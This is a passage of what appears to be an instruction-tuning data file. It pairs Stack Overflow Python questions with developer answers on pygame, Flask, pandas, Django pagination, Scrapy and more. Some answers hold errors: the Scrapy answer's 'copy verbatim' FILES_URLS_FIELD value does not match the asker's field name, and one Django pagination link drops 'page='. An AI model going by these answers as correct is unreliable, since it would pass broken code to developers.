loop\nwhile running:\n    same_foods = False\n\n    # event loop\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n        if event.type == pygame.MOUSEBUTTONDOWN:\n            for i in range(4):\n                if pygame.Rect(17 + 80 * i, 265, 50, 50).collidepoint(event.pos):\n                    clicked[i] = not clicked[i]\n   \n    # clear display\n    screen.fill((255,255,255))\n\n    # draw scene \n    mouse_pos = pygame.mouse.get_pos()\n    for i in range(4):\n        pygame.draw.rect(screen, (colors[i]), (17 + 80 * i, 265, 50, 50))\n        pygame.draw.rect(screen, (0,0,0), (17 + 80 * i, 265, 50, 50),5)\n        if pygame.Rect(17 + 80 * i, 265, 50, 50).collidepoint(mouse_pos):\n            pygame.draw.rect(screen, (255,255,255), (17 + 80 * i, 265, 50, 50), 5)\n\n    for i in range(4):\n        if clicked[i]:\n            screen.blit(check, (17 + 80 * i, 210, 50, 50))\n\n    screen.blit(customer1_img, (50,50))\n    screen.blit(food_box_img, (170,0))\n     \n    # [...]\n\n    # update display\n    pygame.display.flip()\n\npygame.quit()\n<\/code><\/pre>\n<p>The typical PyGame application loop has to:<\/p>\n<ul>\n<li>handle the events by calling either <a href=\"https:\/\/www.pygame.org\/docs\/ref\/event.html#pygame.event.pump\" rel=\"nofollow noreferrer\"><code>pygame.event.pump()<\/code><\/a> or <a href=\"https:\/\/www.pygame.org\/docs\/ref\/event.html#pygame.event.get\" rel=\"nofollow noreferrer\"><code>pygame.event.get()<\/code><\/a>.<\/li>\n<li>update the game states and positions of objects dependent on the input events and time (respectively frames)<\/li>\n<li>clear the entire display or draw the background<\/li>\n<li>draw the entire scene (<code>blit<\/code> all the objects)<\/li>\n<li>update the display by calling either <a href=\"https:\/\/www.pygame.org\/docs\/ref\/display.html#pygame.display.update\" rel=\"nofollow noreferrer\"><code>pygame.display.update()<\/code><\/a> or <a href=\"https:\/\/www.pygame.org\/docs\/ref\/display.html#pygame.display.flip\" rel=\"nofollow noreferrer\"><code>pygame.display.flip()<\/code><\/a><\/li>\n<li>limit the frames per second to limit CPU usage with <a href=\"https:\/\/www.pygame.org\/docs\/ref\/time.html#pygame.time.Clock\" rel=\"nofollow noreferrer\"><code>pygame.time.Clock.tick<\/code><\/a><\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n List with each element max 2 times in Python<p>I have to write a function in Python that takes a list as an input argument and creates a new list where each element can be present 2 times maximum. Inside the function I have to print the number of elements removed from the given list and  return a new list, and print the result.\nIf I call the function as <code>list_name([1, 2, 3, 3, 3, 3, 4, 5, 8, 8])<\/code> then my desired output should be <code>new_list([1, 2, 3, 3, 4, 5, 8, 8])<\/code>.<\/p>\n<p>I tried as follows:<\/p>\n<pre><code>def list_name(elements):\noutput = []\nfor values in elements:\n    if elements.count(values) &lt;= 2 :\n        output.append(values)\nreturn output &quot;\\n&quot; print(list_name([1, 2, 3, 3, 3, 3, 4, 5, 8, 8]))\n<\/code><\/pre>\n<p>Output came as <code>[1, 2, 4, 5, 8, 8]<\/code><\/p>\n<p>What should I do?<\/p>","output_text":"<p>You should count the <code>output<\/code> not the original list:<\/p>\n<pre><code>def list_name(elements):\n    output = []\n    for values in elements:\n        if output.count(values) &lt; 2 : # changed elements.count to output.count and &lt;= to &lt;\n            output.append(values)\n    return output\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>original = [1, 2, 3, 3, 3, 3, 4, 5, 8, 8]\nnew = list_name(original)\nprint(len(original) - len(new), new)\n# 2 [1, 2, 3, 3, 4, 5, 8, 8]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Function that generates all words out of n characters that can be A,B or C<p>We need to make a function that makes all combinations out of <strong>A<\/strong>, <strong>B<\/strong>, and <strong>C<\/strong> with lenght of <strong><em>n<\/em><\/strong>. I tryed making something, I only made it work for 0, 1, and 2 but I dont know how to make it using recursion or nested loops.<\/p>\n\n<p>Example for <code>n=3<\/code>:<\/p>\n\n<p>AAA, BAA, CAA, ABA, BBA, CBA, ACA, BCA, CCA, AAB, BAB, CAB, ABB, BBB, CBB, ACB, BCB, CCB, AAC, BAC, CAC, ABC, BBC, CBC, ACC, BCC, CCC<\/p>\n\n<hr>\n\n<pre><code>def generator (n):\n\n    complete = [ ]\n\n    words = [\"A\", \"B\", \"C\",]\n\n    if (n==1):\n        for word1 in words:\n            complete.append(word1)\n        return complete\n\n    elif (n==0):\n        return complete\n\n    else:\n        for word1 in words:\n            for word2 in words:\n                complete.append(word1+word2)\n\n    return complete\n\n\n\nn = int(input(\"Lenght n: \"))\n\ncomplete = (generator(n))\n\nprint(', '.join(complete))\n<\/code><\/pre>","output_text":"<p>The problem is recursion logic, you need to change it somehow to presents recursion logic correctly, below is an example :<\/p>\n\n<pre><code>    ...\n    #produce results for n-1 length so we can use it later\n    res=generator(n-1)\n    for word1 in words:\n            # for each partial result (length n-1) we can generate final result by concatenating current word to it\n            for r1 in res:\n                complete.append(word1+r1)\n<\/code><\/pre>\n\n<p>Entire code:<\/p>\n\n<pre><code>def generator (n):\n\n    complete = [ ]\n\n    words = [\"A\", \"B\", \"C\",]\n\n    if (n==1):\n        for word1 in words:\n            complete.append(word1)\n        return complete\n\n    elif (n==0):\n        return complete\n\n    else:\n        res=generator(n-1)\n        for word1 in words:\n                for r1 in res:\n                    complete.append(word1+r1)\n\n    return complete\n<\/code><\/pre>\n\n<p>and the result for n=3 : (27 strings)<\/p>\n\n<pre><code>['AAA', 'AAB', 'AAC', 'ABA', 'ABB', 'ABC', 'ACA', 'ACB', 'ACC', 'BAA', 'BAB', 'BAC', 'BBA', 'BBB', 'BBC', 'BCA', 'BCB', 'BCC', 'CAA', 'CAB', 'CAC', 'CBA', 'CBB', 'CBC', 'CCA', 'CCB', 'CCC']\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Polymorphic Argument Lists in Python<p>I want to expose a method with an polymorphic argument list interface:<\/p>\n<pre><code>def my_method(*args: Union[str, Type[MyType], Dict[str, Dict[str, str]] ):\n    pass\n<\/code><\/pre>\n<p>The context is that I want to allow a way to register <code>MyType<\/code> along with initializer parameters. MyType has a name property that is a string. (This is useful because multiple classes can map to the same name, and the category of classes is runtime selectable). <code>Dict[str, Dict[str, str]]<\/code> maps this string name to the arguments to be passed to the matching class of the string.<\/p>\n<p>So the client can call:<\/p>\n<pre><code>my_method(&quot;my_special_class&quot;\n           FastMySpecialClass,\n           {&quot;my_special_class&quot;: {&quot;arg1&quot;: &quot;foo&quot;, &quot;arg2&quot;, &quot;bar&quot;}}\n)\n\n<\/code><\/pre>\n<p>Now in <code>my_method()<\/code> the only thing I can think to handle this is with an <code>isinstance()<\/code> switch\/case. Either with <code>elseif<\/code> or some dict of type to handler function. Kind of like this:<\/p>\n<pre><code>for arg in args:\n    argument_resolver[type(arg)](arg)\n<\/code><\/pre>\n<p>My instincts tell me that this is a horrible way to handle polymorphism, but I can't come up with something better.<\/p>","output_text":"<p>For less complex scenarios, I'd suggest <a href=\"https:\/\/docs.python.org\/3\/library\/functools.html#functools.singledispatch\" rel=\"nofollow noreferrer\">using <code>functools.singledispatch<\/code><\/a>. Trying to make this work for a varargs scenario would be fairly ugly though. Best solution I can think of would have a separate function that is called by <code>my_method<\/code> on each element of the <code>args<\/code> <code>tuple<\/code>, and have that separate function implemented with <code>functools.singledispatch<\/code>.<\/p>\n<p>To be clear, under the hood, <code>functools.singledispatch<\/code> is effectively just doing a slightly optimized version of <code>isinstance<\/code> checking (it maintains a <code>dict<\/code> mapping types to implementing functions; if the <em>exact<\/em> type is registered, the lookup is <code>O(1)<\/code>, but for subclasses and ABCs and the like, it has to fall back to linear scan). But it's generally cleaner looking than mixing it all in one function that implements the behavior for a whole mess of types.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Showing an image on an HTML page without saving to disk<p>I want to load an image from the folder do some processing on it and then show it on the HTML page without storing on the disk. I followed this <a href=\"https:\/\/stackoverflow.com\/questions\/24219446\/render-image-without-saving\">post<\/a> which discusses similar problem but image is not showing<\/p>\n<p>Here is the code I am using<\/p>\n<p><strong>app.py<\/strong><\/p>\n<pre><code>from flask import Flask, render_template\nfrom base64 import b64encode\nimport cv2 as cv\nimport os\n\napp = Flask(__name__)\n\nAPP_ROOT = os.path.dirname(os.path.abspath(__file__))\ntarget = os.path.join(APP_ROOT, 'static')\n\n@app.route(&quot;\/&quot;)\ndef index():\n\n    uri1 = ''\n\n    return render_template(&quot;output.html&quot;, uri1=uri1)\n\n@app.route(&quot;\/img_prcoess&quot;, methods=['POST'])\ndef img_prcoess():\n    \n    # Read the image \n    src_img = cv.imread(&quot;\/&quot;.join([target, 'bradley_cooper.jpg']))\n\n    # Convert image to Gray\n    img1_gray = cv.cvtColor(src_img, cv.COLOR_BGR2GRAY)\n    \n    # Encode\n    uri1 = &quot;data:%s;base64,%s&quot; % (&quot;image\/jpeg&quot;, b64encode(img1_gray))\n    \n    return render_template(&quot;output.html&quot;, uri1=uri1)\n\n\nif __name__ == &quot;__main__&quot;:\n    app.run(port=4444, debug=True)\n<\/code><\/pre>\n<p><strong>output.html<\/strong><\/p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n\n&lt;head&gt;\n    &lt;title&gt;&lt;\/title&gt;\n&lt;\/head&gt;\n\n&lt;body&gt;\n\n    &lt;form id=&quot;form1&quot; action=&quot;{{ url_for('img_prcoess') }}&quot; method=&quot;POST&quot; enctype=&quot;multipart\/form-data&quot;&gt;\n    &lt;input type=&quot;submit&quot; value=&quot;Show Image&quot; id=&quot;button1&quot; width=&quot;100px&quot;&gt;\n    &lt;\/form&gt;\n\n    &lt;img style=&quot;height: 300px&quot; src=&quot;{{ uri1 }}&quot;&gt;\n\n&lt;\/body&gt;\n<\/code><\/pre>\n<p><strong>Directory Structure<\/strong><\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/2N3Qi.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/2N3Qi.png\" alt=\"enter image description here\" \/><\/a><\/p>","output_text":"<p>You cannot convert the raw data of the image into a data url. You have to change the format first.<\/p>\n<pre><code>@app.route('\/process', methods=['POST'])\ndef process():\n    path = os.path.join(APP_ROOT, 'static', 'example.jpg')\n    srcimg = cv.imread(path)\n    dstimg = cv.cvtColor(srcimg, cv.COLOR_BGR2GRAY)\n    retval, buffer = cv.imencode('.jpg', dstimg)\n    uri = &quot;data:%s;base64,%s&quot; % ('image\/jpeg', b64encode(buffer).decode('ascii'))\n    return render_template('process.html', **locals())\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python multiple sub regex<p>Initially having working script like this to go over the csv files in the folder and substitute a sub-string:<\/p>\n<pre><code>import fileinput\nimport os\nimport glob\n\n#### Directory and file mask\nthis = r&quot;C:\\work\\PythonScripts\\Replacer\\*.csv&quot;\noutput_folder = &quot;C:\\\\work\\\\PythonScripts\\\\Replacer\\\\&quot;\n\n#### Get files\nfiles = glob.glob(this)\n\n#### Section to replace\ntext_to_search = 'z'\nreplacement_text = 'ZZ_Top'\n\n#### Loop through files and lines:\nfor f in files:\n    head, tail = os.path.split(f)\n    targetFileName = os.path.join(head, output_folder, tail)\n\n    with fileinput.FileInput(targetFileName, inplace=True, backup='.bak') as file:\n        for line in file:\n            print(line.replace(text_to_search, replacement_text), end='')\n<\/code><\/pre>\n<p>There came a necessity to substitute several Word quotes and long hyphen. So I thought of using something like this in the cycle above:<\/p>\n<pre><code>s = '\u2019 \u2018 \u2019 \u2018 \u2019 \u2013 \u201c \u201d \u201c \u2013 \u2019'\nprint(s)\nprint(s.replace('\u2019', '\\'').replace('\u2018', '\\'').replace('\u2013','-').replace('\u201c','&quot;').replace('\u201d','&quot;'))\n<\/code><\/pre>\n<p>==&gt;<\/p>\n<pre><code>\u2019 \u2018 \u2019 \u2018 \u2019 \u2013 \u201c \u201d \u201c \u2013 \u2019\n' ' ' ' ' - &quot; &quot; &quot; - '\n<\/code><\/pre>\n<p>But then I came across the following comment of using regex sub function:\n<a href=\"https:\/\/stackoverflow.com\/a\/765835\">https:\/\/stackoverflow.com\/a\/765835<\/a><\/p>\n<p>So I tried it and it worked fine on its own:<\/p>\n<pre><code>import re\n\ndef multisub(subs, subject):\n #   &quot;Simultaneously perform all substitutions on the subject string.&quot;\n    pattern = '|'.join('(%s)' % re.escape(p) for p, s in subs)\n    substs = [s for p, s in subs]\n    replace = lambda m: substs[m.lastindex - 1]\n    return re.sub(pattern, replace, subject)\n\nprint(multisub([('\u2019', '\\''), ('\u2018', '\\''), ('\u2013','-'), ('\u201c','&quot;'), ('\u201d','&quot;')], '1\u2019 2\u2018 1\u2019 2\u2018 1\u2019 3\u2013 4\u201c 5\u201d 4\u201c 3\u2013 2\u2019'))\n<\/code><\/pre>\n<p>==&gt;<\/p>\n<pre><code>1' 2' 1' 2' 1' 3- 4&quot; 5&quot; 4&quot; 3- 2'\n<\/code><\/pre>\n<p>But as soon as I sticked it to the original script it runs but doesn't modify the file:<\/p>\n<pre><code>import fileinput\nimport os\nimport glob\nimport re\n\n#### Directory and file mask\nthis = r&quot;C:\\work\\PythonScripts\\Replacer\\*.csv&quot;\noutput_folder = &quot;C:\\\\work\\\\PythonScripts\\\\Replacer\\\\&quot;\n\n#### RegEx substitution func\ndef multisub(subs, subject):\n #   &quot;Simultaneously perform all substitutions on the subject string.&quot;\n    pattern = '|'.join('(%s)' % re.escape(p) for p, s in subs)\n    substs = [s for p, s in subs]\n    replace = lambda m: substs[m.lastindex - 1]\n    return re.sub(pattern, replace, subject)\n\n#### Get files\nfiles = glob.glob(this)\n\n#### Loop through files and lines:\nfor f in files:\n    head, tail = os.path.split(f)\n    targetFileName = os.path.join(head, output_folder, tail)\n\n    with fileinput.FileInput(targetFileName, inplace=True, backup='.bak') as file:\n        for line in file:\n            print(multisub([('\u2019', '\\''), ('\u2018', '\\''), ('\u2013','-'), ('\u201c','&quot;'), ('\u201d','&quot;')], line), end='')\n<\/code><\/pre>\n<p>What could be wrong here?<\/p>","output_text":"<p>It appears that the code is working by itself. The missing piece was that it was running on Windows, so I had to add PYTHONUTF8 system variable with value of 1 to Environment Variables. After this the original code was working fine.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to split comma separated cell values in a list in pandas?<p>I hope you are doing well!<\/p>\n<p>Code:<\/p>\n<pre><code>df = pd.read_excel('Grade.xlsx')\ndf = df.loc[df['Current year'] ==&quot;Final Year&quot;]\nNum = df['Available Number'].values\n<\/code><\/pre>\n<p>Sample data:<\/p>\n<pre><code>Sr no.     Name     Current Year     City      Available Number \n1          joe       First Year      NY        125,869,589,852\n2          mike      Final Year      MI        586\n3          Ross      Final Year      NY        589,639,741\n4          juli      Second Year     NY        869,253\n<\/code><\/pre>\n<p>Now my code copied value &quot;586&quot;(row2) and &quot;589,639,741&quot;(row3) in variable. But I want to covert those values in list(list of integers) and then later I want to iterate in for loop.<\/p>\n<p>I want some thing like this:<\/p>\n<pre><code>list1 = [586]\nlist2 = [589,639,741]\n<\/code><\/pre>\n<p>I don't know how to separate those values and convert it in list.\nIf anyone here can help me? I started learning pandas recently. Thanks in advance.<\/p>","output_text":"<p>Use a loop to convert the strings into list of int:<\/p>\n<pre><code>df['Available Number'] = df['Available Number'] \\\n                             .apply(lambda x: [int(i) for i in x.split(',')])\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>   Sr no.  Name Current Year City      Available Number\n0       1   joe   First Year   NY  [125, 869, 589, 852]\n1       2  mike   Final Year   MI                 [586]\n2       3  Ross   Final Year   NY       [589, 639, 741]\n3       4  juli  Second Year   NY            [869, 253]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How organize pagination with a large number of pages in Django project?<p>I have a <strong>view.py<\/strong> product_list:<\/p>\n<pre><code>...\nfrom django.shortcuts import render, get_object_or_404\nfrom .models import ProductCategory, Product, ProductDetail, ProductSpecialCategory\nfrom django.core.paginator import Paginator, EmptyPage, PageNotAnInteger\n...\ndef product_list(request, category_slug=None, ):\ncategory = None\ncategories = ProductCategory.objects.all()\nobject_list = Product.objects.filter(available=True, is_active=True)\nif category_slug:\n    category = get_object_or_404(ProductCategory, slug=category_slug)\n    object_list = object_list.filter(category=category)\npaginator = Paginator(object_list, 1)\npage = request.GET.get('page')\ntry:\n    products = paginator.page(page)\nexcept PageNotAnInteger:\n    products = paginator.page(1)\nexcept EmptyPage:\n    products = paginator.page(paginator.num_pages)\nreturn render(request, 'shop\/products\/list_by_category\/product_list.html', {'category': category,\n                                                                            'categories': categories,\n                                                                            'products': products,\n                                                                            })\n<\/code><\/pre>\n<p>Based on this handler, I did <strong>pagination.html<\/strong>:<\/p>\n<pre><code>&lt;nav aria-label=&quot;pagination&quot; class=&quot;pagination_area&quot;&gt;\n&lt;ul class=&quot;pagination&quot;&gt;\n    {% if page.has_previous %}\n        &lt;li class=&quot;page-item next&quot;&gt;\n            &lt;a class=&quot;page-link&quot; href=&quot;?page={{ page.previous_page_number }}&quot;&gt;\n                &lt;i class=&quot;fa fa-angle-left&quot; aria-hidden=&quot;true&quot;&gt;&lt;\/i&gt;\n            &lt;\/a&gt;\n        &lt;\/li&gt;\n    {% endif %}\n    {% for i in page.paginator.page_range %}\n        {% if page.number == i %}\n            &lt;li class=&quot;page-item focused&quot;&gt;&lt;a class=&quot;page-link&quot; href=&quot;?page={{ i }}&quot;&gt;{{ i }}&lt;\/a&gt;&lt;\/li&gt;\n            {% elif i &gt; page.number|add:'-1' and i &lt; page.number|add:'1' %}\n            {% else %}\n            &lt;li class=&quot;page-item&quot;&gt;&lt;a class=&quot;page-link&quot; href=&quot;?page={{ i }}&quot;&gt;{{ i }}&lt;\/a&gt;&lt;\/li&gt;\n        {% endif %}\n    {% endfor %}\n    {% if page.has_next %}\n        &lt;li class=&quot;page-item next&quot;&gt;\n            &lt;a class=&quot;page-link&quot; href=&quot;?page={{ page.next_page_number }}&quot;&gt;\n                &lt;i class=&quot;fa fa-angle-right&quot; aria-hidden=&quot;true&quot;&gt;&lt;\/i&gt;\n            &lt;\/a&gt;\n        &lt;\/li&gt;\n    {% endif %}\n&lt;\/ul&gt;\n<\/code><\/pre>\n\nOn the interface, I get the **result**:\n<p><a href=\"https:\/\/i.stack.imgur.com\/sARUB.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/sARUB.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>I would like to organize in such a way that:<\/p>\n<p><em>Show only three pages, the first of which is the previous one, the second is the current, the third is the next. And what is not included in this range are hidden by ellipses, for example.<\/em>:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/GDOeG.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/GDOeG.png\" alt=\"Expected Result\" \/><\/a><\/p>","output_text":"<p>I change <strong>pagination.html<\/strong>. Please try this.<\/p>\n<pre><code>&lt;nav aria-label=&quot;pagination&quot; class=&quot;pagination_area&quot;&gt;\n&lt;div class=&quot;row&quot;&gt;\n  {% if page.end_index &gt; 0 %}\n  &lt;div class=&quot;col-sm-12 col-md-5 d-none d-md-block&quot;&gt;\n    &lt;p&gt;Showing {{ page.start_index }} to {{ page.end_index }} of {{ page.paginator.count}}.&lt;\/p&gt;\n  &lt;\/div&gt;\n  {% endif %}\n  {% if page.paginator.num_pages &gt; 1 %}\n  &lt;div class=&quot;col-sm-12 col-md-7 dataTables_pager&quot;&gt;\n    &lt;ul class=&quot;pagination&quot;&gt;\n      {% if page.has_previous %}\n\n        &lt;li class=&quot;page-item&quot;&gt;\n          &lt;a class=&quot;page-link&quot; data-page=&quot;1&quot; href=&quot;?page={{ page.previous_page_number }}&quot;&gt;\n            &lt;i class=&quot;fa fa-angle-double-left&quot;&gt;&lt;\/i&gt;\n          &lt;\/a&gt;\n        &lt;\/li&gt;\n        {% if page.previous_page_number &gt; 1 %}\n          &lt;li class=&quot;page-item&quot;&gt;\n            &lt;a class=&quot;page-link &quot; data-page=&quot;{{page.previous_page_number}}&quot;  href=&quot;?page={{ page.previous_page_number }}&quot;&gt;\n              &lt;i class=&quot;fa fa-angle-left&quot;&gt;&lt;\/i&gt;\n            &lt;\/a&gt;\n          &lt;\/li&gt;\n        {% endif %}\n\n      {% endif %}\n\n      {% if page.previous_page_number &gt; 2 %}\n        &lt;li class=&quot;page-item&quot;&gt;\n          &lt;a class=&quot;page-link &quot; data-page=&quot;{{page.number|add:'-2'}}&quot; href=&quot;?{{page.number|add:'-2'}}&quot;&gt; {{ page.number|add:&quot;-2&quot; }} &lt;\/a&gt;\n         &lt;\/li&gt;\n        &lt;li class=&quot;page-item&quot;&gt;\n          &lt;a class=&quot;page-link &quot; data-page=&quot;{{page.number|add:'-1'}}&quot; href=&quot;?page={{page.number|add:'-1'}}&quot;&gt; {{ page.number|add:&quot;-1&quot; }} &lt;\/a&gt;\n        &lt;\/li&gt;\n      {% endif %}\n\n      &lt;li class=&quot;page-item active&quot;&gt;&lt;span class=&quot;page-link &quot;&gt;{{ page.number }}&lt;\/span&gt;&lt;\/li&gt;\n\n      {% if page.paginator.num_pages &gt; page.number|add:&quot;2&quot; %}\n        &lt;li class=&quot;page-item&quot;&gt;\n          &lt;a class=&quot;page-link &quot; data-page=&quot;{{page.number|add:'1'}}&quot; href=&quot;?page={{page.number|add:'1'}}&quot;&gt; {{ page.number|add:&quot;1&quot; }} &lt;\/a&gt;\n        &lt;\/li&gt;\n        &lt;li class=&quot;page-item&quot;&gt;\n          &lt;a class=&quot;page-link &quot; data-page=&quot;{{page.number|add:'2'}}&quot; href=&quot;?page={{page.number|add:'2'}}&quot;&gt; {{ page.number|add:&quot;2&quot; }} &lt;\/a&gt;\n        &lt;\/li&gt;\n      {% endif %}\n\n      {% if page.has_next %}\n        &lt;li class=&quot;page-item&quot;&gt;\n          &lt;a class=&quot;page-link &quot; data-page=&quot;{{page.next_page_number}}&quot; href=&quot;?page={{ page.next_page_number }}&quot;&gt;\n            &lt;i class=&quot;fa fa-angle-right&quot;&gt;&lt;\/i&gt;\n          &lt;\/a&gt;\n        &lt;\/li&gt;\n\n        &lt;li class=&quot;page-item&quot;&gt;\n          &lt;a class=&quot;page-link &quot; data-page=&quot;{{page.paginator.num_pages}}&quot; href=&quot;?page={{page.paginator.num_pages}}&quot;&gt;\n            &lt;i class=&quot;fa fa-angle-double-right&quot;&gt;&lt;\/i&gt;\n          &lt;\/a&gt;\n        &lt;\/li&gt;\n      {% endif %}\n    &lt;\/ul&gt;\n  &lt;\/div&gt;\n  {% endif %}\n&lt;\/div&gt;\n&lt;\/nav&gt;\n<\/code><\/pre>\n<p>My design just like this. If you change design for your needs.\nHere click <code>&lt;&lt;<\/code> to go first page , <code>&gt;&gt;<\/code> to go last page , <code>&lt;<\/code> to go previous page and <code>&gt;<\/code> to go next page.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/6uBIV.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/6uBIV.png\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Scrapy doesn't download files with File<p>I've no clue about what's happening with my code. I wrote my spider and loaded items as describe at <a href=\"https:\/\/docs.scrapy.org\/en\/latest\/topics\/media-pipeline.html\" rel=\"nofollow noreferrer\">https:\/\/docs.scrapy.org\/en\/latest\/topics\/media-pipeline.html<\/a> but scrapy doesn't download any file:<\/p>\n<pre><code>2022-07-19 01:35:09 [scrapy.core.engine] INFO: Spider opened\n2022-07-19 01:35:09 [scrapy.extensions.logstats] INFO: Crawled 0 pages (at 0 pages\/min), scraped 0 items (at 0 items\/min)\n2022-07-19 01:35:09 [scrapy.extensions.telnet] INFO: Telnet console listening on 127.0.0.1:6023\n2022-07-19 01:35:09 [scrapy.downloadermiddlewares.redirect] DEBUG: Redirecting (301) to &lt;GET https:\/\/www.tp-link.com\/br\/support\/download\/&gt; from &lt;GET https:\/\/www.tp-link.com\/br\/support\/download&gt;\n2022-07-19 01:35:09 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https:\/\/www.tp-link.com\/br\/support\/download\/&gt; (referer: None)\n2022-07-19 01:35:10 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https:\/\/www.tp-link.com\/br\/support\/download\/archer-c7\/&gt; (referer: https:\/\/www.tp-link.com\/br\/support\/download\/)\n2022-07-19 01:35:10 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https:\/\/www.tp-link.com\/br\/support\/download\/archer-c7\/v4\/&gt; (referer: https:\/\/www.tp-link.com\/br\/support\/download\/archer-c7\/)\n2022-07-19 01:35:10 [scrapy.core.scraper] DEBUG: Scraped from &lt;200 https:\/\/www.tp-link.com\/br\/support\/download\/archer-c7\/v4\/&gt;\n{'file_urls': ['https:\/\/static.tp-link.com\/2019\/201912\/20191206\/Archer%20C7(US)_V4_190411.zip',\n               'https:\/\/static.tp-link.com\/2018\/201804\/20180428\/Archer%20C7(US)_V4_180425.zip',\n               'https:\/\/static.tp-link.com\/2017\/201712\/20171221\/Archer%20C7(US)_V4_171101.zip'],\n 'model': 'Archer C7 ',\n 'vendor': 'TP-Link',\n 'version': 'V4'}\n2022-07-19 01:35:10 [scrapy.core.engine] INFO: Closing spider (finished)\n2022-07-19 01:35:10 [scrapy.statscollectors] INFO: Dumping Scrapy stats:\n{'downloader\/request_bytes': 1082,\n 'downloader\/request_count': 4,\n 'downloader\/request_method_count\/GET': 4,\n 'downloader\/response_bytes': 77004,\n 'downloader\/response_count': 4,\n 'downloader\/response_status_count\/200': 3,\n 'downloader\/response_status_count\/301': 1,\n 'elapsed_time_seconds': 1.45197,\n 'finish_reason': 'finished',\n 'finish_time': datetime.datetime(2022, 7, 19, 1, 35, 10, 957079),\n 'httpcompression\/response_bytes': 667235,\n 'httpcompression\/response_count': 3,\n 'item_scraped_count': 1,\n 'log_count\/DEBUG': 6,\n 'log_count\/INFO': 10,\n 'memusage\/max': 93999104,\n 'memusage\/startup': 93999104,\n 'request_depth_max': 2,\n 'response_received_count': 3,\n 'scheduler\/dequeued': 4,\n 'scheduler\/dequeued\/memory': 4,\n 'scheduler\/enqueued': 4,\n 'scheduler\/enqueued\/memory': 4,\n 'start_time': datetime.datetime(2022, 7, 19, 1, 35, 9, 505109)}\n2022-07-19 01:35:10 [scrapy.core.engine] INFO: Spider closed (finished)\n<\/code><\/pre>\n<p><strong>My Item Class<\/strong>\nI defined some customs fields, but <strong>file_urls<\/strong> and <strong>files<\/strong> are created as scrapy documentation:<\/p>\n<pre><code>class FirmwareItem(scrapy.Item):\n    # define the fields for your item here like:\n    vendor = scrapy.Field()\n    model = scrapy.Field()\n    version = scrapy.Field()\n    file_urls = scrapy.Field()\n    files = scrapy.Field()\n<\/code><\/pre>\n<p><strong>ParseMethod<\/strong>\nHere I get the zip files link at page and load them as list at 'file_urls':<\/p>\n<pre><code>def parseVersion(self,response):\n        \n        firmware = FirmwareItem()\n        firmware['vendor'] = &quot;TP-Link&quot;\n        firmware['model'] = response.xpath('\/\/em[@id=&quot;model-version-name&quot;]\/text()').get()\n        firmware['version'] = response.xpath('\/\/em[@id=&quot;model-version-name&quot;]\/span\/text()').get()\n        urls = response.xpath('\/\/div[@data-id=&quot;Firmware&quot;]\/\/a[@class=&quot;download-resource-btn ga-click&quot;]\/@href').getall()\n       \n        firmware['file_urls'] = [url.replace(' ',&quot;%20&quot;) for url in urls]\n        yield firmware\n<\/code><\/pre>\n<p><strong>Settings<\/strong>\nEnabling Item Pipelines and setting default dir:<\/p>\n<pre><code>ITEM_PIPELINES = {\n    'router.pipelines.RouterPipeline': 300,\n}\nFILES_STORE = &quot;downloaded&quot;\n<\/code><\/pre>\n<p><strong>Pipeline<\/strong>\nKept as default:<\/p>\n<pre><code>from itemadapter import ItemAdapter\n\nclass RouterPipeline:\n    def process_item(self, item, spider):\n        return item\n<\/code><\/pre>","output_text":"<p>You are almost there... Make sure you have all of these settings set in your settings.py:<\/p>\n<pre><code>ITEM_PIPELINES = {\n    'scrapy.pipelines.files.FilesPipeline': 1,\n    'router.pipelines.RouterPipeline': 300,\n}\n\nFILES_STORE = '\/path\/to\/save\/directory'  # set your preferred download directory\n\nFILES_URLS_FIELD = 'files_urls'  # copy verbatim\nFILES_RESULT_FIELD = 'files'     # copy verbatim\n<\/code><\/pre>"}
